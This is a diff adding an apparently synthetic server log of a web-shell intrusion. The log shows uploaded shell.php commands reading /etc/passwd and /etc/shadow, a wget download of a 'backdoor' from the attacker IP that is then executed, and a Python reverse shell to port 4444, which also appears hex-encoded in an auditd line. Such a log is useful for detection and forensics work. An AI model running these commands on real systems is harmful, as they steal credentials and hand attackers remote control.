@@ -1,0 +1,23 @@
+Jul 28 08:12:33 web-server apache2[2010]: 185.220.102.5 - - [28/Jul/2026:08:12:33 +0000] "POST /upload.php" 200 42 "-" "Mozilla/5.0"
+Jul 28 08:12:35 web-server apache2[2011]: 185.220.102.5 - - [28/Jul/2026:08:12:35 +0000] "GET /uploads/shell.php" 200 5123 "-" "curl/7.68.0"
+Jul 28 08:12:36 web-server apache2[2012]: 185.220.102.5 - - [28/Jul/2026:08:12:36 +0000] "GET /uploads/shell.php?cmd=id" 200 102 "-" "curl/7.68.0"
+Jul 28 08:12:40 web-server apache2[2013]: 185.220.102.5 - - [28/Jul/2026:08:12:40 +0000] "GET /uploads/shell.php?cmd=whoami" 200 106 "-" "curl/7.68.0"
+Jul 28 08:12:45 web-server apache2[2014]: 185.220.102.5 - - [28/Jul/2026:08:12:45 +0000] "GET /uploads/shell.php?cmd=uname+-a" 200 512 "-" "curl/7.68.0"
+Jul 28 08:13:00 web-server apache2[2015]: 185.220.102.5 - - [28/Jul/2026:08:13:00 +0000] "GET /uploads/shell.php?cmd=ls+-la+/etc/" 200 2048 "-" "curl/7.68.0"
+Jul 28 08:13:15 web-server apache2[2016]: 185.220.102.5 - - [28/Jul/2026:08:13:15 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd" 200 4096 "-" "curl/7.68.0"
+Jul 28 08:13:30 web-server apache2[2017]: 185.220.102.5 - - [28/Jul/2026:08:13:30 +0000] "GET /uploads/shell.php?cmd=cat+/etc/shadow" 200 5120 "-" "curl/7.68.0"
+Jul 28 08:13:45 web-server apache2[2018]: 185.220.102.5 - - [28/Jul/2026:08:13:45 +0000] "GET /uploads/shell.php?cmd=wget+http://185.220.102.5:8000/backdoor" 200 53 "-" "curl/7.68.0"
+Jul 28 08:13:46 web-server apache2[2019]: 185.220.102.5 - - [28/Jul/2026:08:13:46 +0000] "GET /uploads/backdoor" 200 10240 "-" "curl/7.68.0"
+Jul 28 08:14:00 web-server apache2[2020]: 185.220.102.5 - - [28/Jul/2026:08:14:00 +0000] "GET /uploads/shell.php?cmd=chmod+%2Bx+/var/www/html/uploads/backdoor" 200 0 "-" "curl/7.68.0"
+Jul 28 08:14:15 web-server apache2[2021]: 185.220.102.5 - - [28/Jul/2026:08:14:15 +0000] "GET /uploads/shell.php?cmd=./backdoor" 200 53 "-" "curl/7.68.0"
+Jul 28 08:14:20 web-server mod_security[2025]: [SECURITY] Suspicious file upload detected - shell.php - matched rule 942100 (SQL Injection)
+Jul 28 08:14:20 web-server mod_security[2025]: [SECURITY] File upload contains PHP code in non-PHP extension - matched rule 933210
+Jul 28 08:14:45 web-server sshd[2030]: Accepted password for www-data from 185.220.102.5 port 50022 ssh2
+Jul 28 08:14:46 web-server sshd[2030]: pam_unix(sshd:session): session opened for user www-data by (uid=0)
+Jul 28 08:15:00 web-server sudo[2035]:   www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/su -
+Jul 28 08:15:01 web-server su[2036]: pam_unix(su:auth): authentication failure; logname=www-data uid=33 euid=0 tty=pts/0 ruser=www-data rhost=  user=root
+Jul 28 08:15:05 web-server sudo[2038]:   www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+Jul 28 08:15:10 web-server sudo[2040]:   www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("185.220.102.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+Jul 28 08:15:30 web-server auditd[2045]: PROCTITLE proctitle=707974686f6e33002d6300696d706f727420736f636b65742c73756270726f636573732c6f733b733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b732e636f6e6e6563742828223138352e3232302e3130322e35222c3434343429293b6f732e6475703228732e66696c656e6f28292c30293b6f732e6475703228732e66696c656e6f28292c31293b6f732e6475703228732e66696c656e6f28292c32293b73756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d29
+Jul 28 08:16:00 web-server auditd[2050]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=7f3b8c0b0b88 a1=7f3b8c0b0c50 a2=7f3b8c0b0d18 a3=8 items=2 ppid=2040 pid=2051 auid=33 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="sh" exe="/usr/bin/dash"
+Jul 28 08:16:30 web-server fail2ban[300]: [apache] Ban 185.220.102.5 (detected webshell activity via mod_security)
